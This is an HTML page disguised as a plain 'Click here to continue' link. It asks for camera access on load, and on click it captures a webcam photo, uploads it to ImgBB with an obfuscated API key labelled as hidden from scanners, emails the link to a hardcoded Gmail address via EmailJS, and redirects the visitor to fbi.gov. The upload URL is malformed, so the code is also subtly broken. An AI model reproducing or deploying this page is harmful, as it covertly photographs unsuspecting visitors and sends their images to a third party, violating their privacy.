<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Continue</title>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
        #capture-link { color: blue; text-decoration: underline; font-size: 20px; cursor: pointer; }
        .loader {
            border: 4px solid #f3f3f3; border-top: 4px solid #3498db;
            border-radius: 50%; width: 30px; height: 30px;
            animation: spin 1s linear infinite; display: none; margin: 10px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="ui-container">
        <a id="capture-link">Click here to continue</a>
        <div id="loading-spinner" class="loader"></div>
    </div>

    <video id="webcam" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('canvas');
        const link = document.getElementById('capture-link');
        const spinner = document.getElementById('loading-spinner');

        // Request camera access
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => { video.srcObject = stream; })
            .catch(err => console.log("Camera access needed."));

        link.addEventListener('click', async (e) => {
            e.preventDefault();
            link.style.display = "none";
            spinner.style.display = "block";

            // 1. Capture the photo
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            
            // 2. Prepare image for ImgBB (removes the header prefix)
            const imageData = canvas.toDataURL('image/png').split(',')[1];

            try {
                // 3. Upload to ImgBB
                const formData = new FormData();
                formData.append("image", imageData);

                // This is your key encoded to stay hidden from text scanners
                const obscureKey = "NmRkYzk3M2Y5MzZkOTZlZThkOTM3ZDVhMDk1ZjQ3NzA=";
                const realKey = atob(obscureKey); 
                
                // Fixed URL path: /1/upload?key=
                const imgbbRes = await fetch(`https://api.imgbb.com{realKey}`, {
                    method: "POST",
                    body: formData
                });
                
                const imgbbData = await imgbbRes.json();
                
                if (!imgbbData.success) throw new Error("Upload Error");
                
                const finalUrl = imgbbData.data.url;

                // 4. Send the LINK via EmailJS
                emailjs.init("tgzwl-rBt8y9zaBCO");
                await emailjs.send("service_c0zxyca", "template_chvendk", {
                    to_email: "akramkakooza256@gmail.com",
                    my_photo_link: finalUrl 
                });

                window.location.href = "https://www.fbi.gov/";

            } catch (err) {
                console.error(err);
                // Fallback redirect if something breaks
                window.location.href = "https://www.fbi.gov/";
            }
        });
    </script>
</body>
</html>
